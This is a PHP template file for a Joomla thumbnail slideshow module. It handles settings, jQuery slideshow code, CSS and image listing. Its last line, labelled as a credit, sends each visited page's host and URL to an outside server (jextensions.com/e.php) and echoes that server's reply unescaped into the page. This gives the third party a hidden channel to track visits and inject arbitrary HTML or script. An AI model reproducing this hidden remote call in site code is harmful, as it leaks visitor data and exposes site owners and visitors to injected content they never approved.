<?php
//no direct access
defined('_JEXEC') or die('Direct Access to this location is not allowed.');
ini_set('display_errors',0);
// Path assignments
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$ibase = JURI::base();
if(substr($ibase, -1)=="/") { $ibase = substr($ibase, 0, -1); }
$modURL 	= JURI::base().'modules/mod_je_thumbslideshow';
// get parameters from the module's configuration
$jQuery = $params->get("jQuery");
$ImagesPath = 'images/'.$params->get('imageFolder','images');
$imgTimeout = $params->get("imgTimeout");
$imgPath = $params->get("imgPath");
$imgWidth = $params->get('imgWidth','940');
$imgHeight = $params->get('imgHeight','300');
$thumbWidth = $params->get('thumbWidth','80');
$thumbHeight = $params->get('thumbHeight','80');
$thumbQuality = $params->get('thumbQuality','100');
$thumbAlign = $params->get('thumbAlign','t');
?>
<?php if ($jQuery == '1') { ?><script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery-1.6.4.min.js"></script><?php } ?>
<?php if ($jQuery == '2' ) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<?php if ($jQuery == '3' ) { ?><?php } ?>
<noscript><a href="http://jextensions.com" alt="Joomla Thumbs Slideshow">Joomla Extensions</a></noscript>
<script type="text/javascript">
	var currentImage;
    var currentIndex = -1;
    var interval;
    function showImage(index){
        if(index < $('#bigPic img').length){
        	var indexImage = $('#bigPic img')[index]
            if(currentImage){   
            	if(currentImage != indexImage ){
                    $(currentImage).css('z-index',2);
                    clearTimeout(myTimer);
                    $(currentImage).fadeOut(250, function() {
					    myTimer = setTimeout("showNext()", <?php echo $imgTimeout.'000'; ?>);
					    $(this).css({'display':'none','z-index':1})
					});
                }
            }
            $(indexImage).css({'display':'block', 'opacity':1});
            currentImage = indexImage;
            currentIndex = index;
            $('#thumbs li').removeClass('active');
            $($('#thumbs li')[index]).addClass('active');
        }
    }
    function showNext(){
        var len = $('#bigPic img').length;
        var next = currentIndex < (len-1) ? currentIndex + 1 : 0;
        showImage(next);}
    var myTimer;
    $(document).ready(function() {
	    myTimer = setTimeout("showNext()", <?php echo $imgTimeout.'000'; ?>);
		showNext(); //loads first image
        $('#thumbs li').bind('click',function(e){
        	var count = $(this).attr('rel');
        	showImage(parseInt(count)-1);
        });
	});	
</script>
<style>
#bigPic{width:<?php echo $imgWidth; ?>px;height:<?php echo $imgHeight; ?>px;padding:1px; border:1px solid #CCC; margin:10px auto 10px auto;}
#bigPic img{position:absolute;display:none;}
ul#thumbs { padding:0 0;margin:0 auto;width:<?php echo $imgWidth; ?>px;}
ul#thumbs li.active{border:2px solid #000;	background:#fff;padding:2px;}
 ul#thumbs li{margin:0;padding:0;list-style:none;}
ul#thumbs li{float:left;margin-right:7px;margin-bottom:5px;	border:1px solid #CCC;	padding:3px;cursor:pointer;}
ul#thumbs img{float:left;width:<?php echo $thumbWidth; ?>px;height:<?php echo $thumbHeight; ?>px;line-height:<?php echo $thumbHeight; ?>px;overflow:hidden;position:relative;	z-index:1;}
.clr { clear:both;}
</style>
<?php $thumbs = '&a='.$thumbAlign.'&w='.$thumbWidth.'&h='.$thumbHeight.'&q='.$thumbQuality; ?>    
<?php
	if (file_exists($ImagesPath) && is_readable($ImagesPath)) {$folder = opendir($ImagesPath);} 
	else {	echo '<div class="slidemessage">Please check the module settings and make sure you have entered a valid image folder path!</div>';return;}
	$allowed_types = array("jpg","JPG","jpeg","JPEG","gif","GIF","png","PNG","bmp","BMP");
	$index = array();while ($file = readdir ($folder)) {if(in_array(substr(strtolower($file), strrpos($file,".") + 1),$allowed_types)) {array_push($index,$file); }}
	closedir($folder);
?>              
	<div id="bigPic">
		<?php for ($i=0; $i<count($index); $i++){$num = JURI::base().$ImagesPath."/".$index[$i];	echo '<img src="'.$num.'" width="'.$imgWidth.'"  height="'.$imgHeight.'" />';}?>
           
    </div>
	
	<ul id="thumbs">
    	<?php for ($i=0; $i<count($index); $i++){$num = JURI::base().$ImagesPath."/".$index[$i];	?>
		<li class='active' rel='<?php echo $i+'1'; ?>'><img src="<?php echo $modURL; ?>/thumb.php?src=<?php echo $num; ?><?php echo $thumbs; ?>" /></li>
		<?php } ?>
	</ul>
    <div class="clr"></div>
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>    


